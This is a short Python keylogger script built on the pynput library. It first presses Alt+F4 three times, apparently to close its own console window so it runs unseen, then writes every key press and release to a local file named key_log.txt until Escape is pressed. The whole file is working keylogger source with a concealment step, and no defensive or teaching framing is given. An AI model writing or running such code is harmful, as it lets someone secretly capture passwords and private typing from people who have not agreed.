from pynput import keyboard
import os
import time
from pynput.keyboard import Key, Controller

# Function to press Alt + F4 three times
def close_cmd():
    keyboard_ctrl = Controller()
    for _ in range(3):
        time.sleep(0.1)  # Wait for 1 second between each attempt
        keyboard_ctrl.press(Key.alt)
        keyboard_ctrl.press(Key.f4)
        keyboard_ctrl.release(Key.f4)
        keyboard_ctrl.release(Key.alt)
        time.sleep(1)  # Ensure the key press is registered

# Call the function to close CMD
close_cmd()

# Get the directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))

# Define the file name and path
file_name = 'key_log.txt'
file_path = os.path.join(script_dir, file_name)

# Create the file if it does not exist
if not os.path.exists(file_path):
    with open(file_path, 'w') as f:
        f.write('Key Logger Started\n')

def on_press(key):
    try:
        log = f'Alphanumeric key {key.char} pressed\n'
    except AttributeError:
        log = f'Special key {key} pressed\n'

    with open(file_path, 'a') as f:
        f.write(log)

def on_release(key):
    log = f'Key {key} released\n'
    with open(file_path, 'a') as f:
        f.write(log)
    
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
